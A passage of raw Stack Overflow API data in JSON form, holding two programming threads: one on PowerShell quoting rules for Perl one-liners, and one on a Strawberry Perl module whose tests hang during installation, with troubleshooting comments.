quotes in PowerShell? That is a question that I try to provide the answer to. If OP does not want that question answered it would be nice that the questions gets edited so it omits posting that question :)"}, {"owner": {"user_type": "does_not_exist", "display_name": "user6811411"}, "edited": false, "score": 0, "creation_date": 1532597958, "post_id": 51534704, "comment_id": 90038910, "body": "That&#39;s excatly TobyUs answering comment, ignoring the questions title and examples. Once you pass a score of 10k you&#39;ll see deleted answers/questions."}], "tags": [], "owner": {"reputation": 924, "user_id": 10115111, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-pKBEaezWLP8/AAAAAAAAAAI/AAAAAAAAAAc/WHN0GwdbIYs/photo.jpg?sz=128", "display_name": "Henrik Stanley Mortensen", "link": "https://stackoverflow.com/users/10115111/henrik-stanley-mortensen"}, "is_accepted": false, "score": 0, "last_activity_date": 1532596711, "last_edit_date": 1532596711, "creation_date": 1532594831, "answer_id": 51534704, "question_id": 51532675, "link": "https://stackoverflow.com/questions/51532675/quotes-in-powershell-and-perl-one-liners/51534704#51534704", "title": "Quotes in powershell and perl one liners", "body": "<p>Microsoft has a whole <a href=\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_quoting_rules?view=powershell-6\" rel=\"nofollow noreferrer\">about page</a> for Single Quotes vs Double Quotes.</p>\n\n<p>The main take away is that:<br>\n1. A string with single quotes can contain double quotes.<br>\n2. A string with double quotes can contain single quotes<br>\n3. A string with single quotes will take things such as variables and pass them not as the variable, but as the text.  </p>\n\n<p>So we setup a string</p>\n\n<pre><code>$string = \"this is me\"\n</code></pre>\n\n<p>And try to print it with double quotes:</p>\n\n<pre><code>write-host \"who is this? $string\"\n</code></pre>\n\n<p>Gives  </p>\n\n<pre><code>who is this? this is me\n</code></pre>\n\n<p>And if we now try with single quotes:  </p>\n\n<pre><code>write-host 'who is this? $string'\n</code></pre>\n\n<p>Gives</p>\n\n<pre><code>who is this? $string\n</code></pre>\n"}], "owner": {"reputation": 65, "user_id": 5674123, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/96b8df26eca0fc6e26e571b4491e0c20?s=128&d=identicon&r=PG&f=1", "display_name": "ajith.mk", "link": "https://stackoverflow.com/users/5674123/ajith-mk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 109, "favorite_count": 0, "closed_date": 1532598324, "answer_count": 1, "score": 1, "last_activity_date": 1532596711, "creation_date": 1532587988, "question_id": 51532675, "link": "https://stackoverflow.com/questions/51532675/quotes-in-powershell-and-perl-one-liners", "closed_reason": "Duplicate", "title": "Quotes in powershell and perl one liners", "body": "<p>What exactly are the rules for quotes in powershell? Single quotes can contain literal double quotes. Right?</p>\n\n<pre><code>PS C:\\Users&gt; '\"Hello world\"'\n\"Hello world\"\nPS C:\\Users&gt; perl -e 'print \\\"Heloo World\\n\\\"'\nHeloo World\nPS C:\\Users&gt; perl -e 'print \"Heloo World\\n\"'\nPS C:\\Users&gt;\n</code></pre>\n\n<p>See? Even after surrounding the command in single quotes, I need to escape those double quotes. What is happening?</p>\n"}, {"tags": ["perl", "cpan", "strawberry-perl", "autovivification"], "comments": [{"owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 0, "creation_date": 1532580019, "post_id": 51530647, "comment_id": 90029983, "body": "Please run the tests manually so you can see where exactly it hangs. <code>perl -mCPAN -e &quot;CPAN::Shell-&gt;look(&#39;autovivification&#39;)&quot;</code> ; <code>perl Makefile.PL</code> ; <code>gmake</code> ; <code>prove -bv</code>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 0, "creation_date": 1532609804, "post_id": 51530647, "comment_id": 90046326, "body": "@daxim: I think Strawberry uses <code>dmake</code>."}, {"owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 0, "creation_date": 1532611666, "post_id": 51530647, "comment_id": 90047652, "body": "it ships with gmake and is configured to use it, check <code>%PERLROOT%\\c\\bin</code> and <code>perl -MConfig -E &quot;say $Config{make}&quot;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532610267, "post_id": 51530880, "comment_id": 90046623, "body": "No, it&#39;s not the best solution. You need to check what the issue is with the tests. Run <code>cpan</code> to get the <code>cpan&gt;</code> prompt and then do <code>look autovivication</code>. This will take you to a cmd prompt in a directory where the module has been downloaded and unpacked. Then you can create the Makefile with <code>perl Makefile.PL</code>, build the module with <code>dmake</code> and test it with <code>dmake test</code>. It should be obvious what the problem is. You can then <code>dmake install</code> to install the tested module if it passes."}, {"owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 0, "creation_date": 1532611798, "post_id": 51530880, "comment_id": 90047737, "body": "tests should run in <a href=\"http://p3rl.org/Test::Harness#HARNESS_VERBOSE\" rel=\"nofollow noreferrer\">verbose mode</a>"}], "tags": [], "owner": {"reputation": 575, "user_id": 1664153, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/e5a320d8d0e7ed695b35c2959db52e66?s=128&d=identicon&r=PG", "display_name": "Damian Green", "link": "https://stackoverflow.com/users/1664153/damian-green"}, "is_accepted": false, "score": -1, "last_activity_date": 1532578262, "creation_date": 1532578262, "answer_id": 51530880, "question_id": 51530647, "link": "https://stackoverflow.com/questions/51530647/problems-installing-autovivification-module-in-strawberry-perl/51530880#51530880", "title": "Problems installing &quot;autovivification&quot; module in Strawberry Perl", "body": "<p>Well, I'm not sure that this is really the best solution, but I think I just found a workaround for this problem. I simply skipped the make test part of the installation by opening the cpan shell, then doing: \"notest install autovivification\". That skipped the testing, so it wouldn't hang and it seemed to finish installing the module OK.  I briefly tested the package to see if it loaded, and it seems to have, but there's a chance that something could still be wrong. I'll update this post if I encounter a problem... </p>\n"}], "owner": {"reputation": 575, "user_id": 1664153, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/e5a320d8d0e7ed695b35c2959db52e66?s=128&d=identicon&r=PG", "display_name": "Damian Green", "link": "https://stackoverflow.com/users/1664153/damian-green"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 97, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1532610652, "creation_date": 1532576359, "last_edit_date": 1532610652, "question_id": 51530647, "link": "https://stackoverflow.com/questions/51530647/problems-installing-autovivification-module-in-strawberry-perl", "title": "Problems installing &quot;autovivification&quot; module in Strawberry Perl", "body": "<p>I have Strawberry Perl installed on my Windows 10 computer. I have been able to successfully install a number of CPAN modules, but I am getting stuck on the\n<a href=\"https://metacpan.org/pod/autovivification\" rel=\"nofollow noreferrer\"><code>autovivification</code></a>\nmodule.</p>\n\n<p>It hangs on the <code>make test</code> part of the installation and I have to force it to quit. If I then try to run a program that uses <code>no autovivification</code> it fails with an error that it can't find the module in <code>@INC</code> which makes sense because it didn't install correctly.</p>\n\n<p>I'm really not sure what to do next. Has anyone else had the same problem with installing this module on Strawberry Perl? What can be done about it?</p>\n"}]